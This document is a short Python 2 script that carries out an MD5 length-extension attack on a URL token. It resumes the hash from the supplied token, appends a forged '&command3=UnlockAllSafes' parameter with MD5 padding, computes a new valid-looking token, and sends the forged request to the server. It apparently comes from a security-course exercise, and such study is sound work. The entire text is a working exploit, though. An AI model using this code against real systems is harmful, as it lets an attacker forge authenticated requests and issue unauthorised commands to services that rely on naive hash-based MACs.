from pymd5 import md5, padding
import httplib, urlparse, sys, urllib, math

# get original url
url = sys.argv[1]
parsedUrl = urlparse.urlparse(url)
token = parsedUrl.query.split('&')[0][6:]
message = parsedUrl.query.split('&', 1)[1]

# conduct attack
length_of_m = 8 + len(message) # bytes
count = (length_of_m + len(padding(length_of_m * 8))) * 8 # bits

# update hash
h = md5(state=token.decode('hex'), count=count)
extension = '&command3=UnlockAllSafes'
h.update(extension)

# update url and add padding so server can verify correctly
newtoken = urllib.quote(h.hexdigest())
url = 'https://' + parsedUrl.hostname + parsedUrl.path + \
        '?token=' + newtoken + '&' + message + \
        urllib.quote(padding(length_of_m * 8)) + extension

# send url
parsedUrl = urlparse.urlparse(url)
conn = httplib.HTTPSConnection(parsedUrl.hostname, parsedUrl.port)
conn.request("GET", parsedUrl.path + "?" + parsedUrl.query)
print conn.getresponse().read()
